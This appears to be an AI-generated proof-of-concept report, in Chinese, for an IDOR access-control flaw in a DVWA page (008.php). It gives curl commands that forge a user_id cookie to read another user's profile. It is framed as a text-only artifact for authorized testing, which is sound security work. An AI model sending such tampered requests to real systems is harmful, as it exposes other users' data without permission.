# POC — DVWA 008.php 通过可篡改的 user_id Cookie 实现越权访问任意用户资料（BAC/IDOR）

- finding_id: `LLM-be8d58eeb7fa`
- type: `idor` / CWE-639
- severity: `high`
- file: `008.php:47`

## 步骤

1. **确认目标可达且已获授权**  
```http
curl -sS -i 'http://TARGET:8080/008.php'
```
预期：返回应用页面/接口响应，而不是连接失败

2. **发送 越权 / IDOR 载荷**  
```http
curl -sS -i -X GET 'http://TARGET:8080/008.php' \
  -H 'Cookie: user_id=2'
```
预期：使用其他对象 ID 返回他人数据或执行他人操作。

3. **记录响应与副作用：对比基线响应，检查 TARGET 侧文件或带外通道**  
预期：出现与基线不同的内容、状态码、延迟或副作用

## 安全说明

POC 仅为文本工件；落日二号不会执行它，也不会联网或搭建沙箱。仅限授权测试。